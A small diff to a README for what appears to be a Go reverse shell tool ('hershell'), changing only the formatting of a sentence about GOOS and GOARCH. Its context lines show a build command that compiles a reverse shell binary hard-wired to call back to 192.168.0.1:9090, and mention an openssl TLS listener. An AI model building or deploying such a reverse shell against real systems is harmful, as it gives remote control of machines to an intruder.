@@ -23,7 +23,7 @@ For Linux:
 $ GOOS=linux GOARCH=amd64 go build --ldflags "-X main.connectString=192.168.0.1:9090" -o reverse.exe hershell.go
 ```
 
-Just use the GOOS and GOARCH variables to define the target.
+Just use the ``GOOS`` and ``GOARCH`` variables to define the target.
 
 On the server side, you can use the openssl integrated TLS server:
 
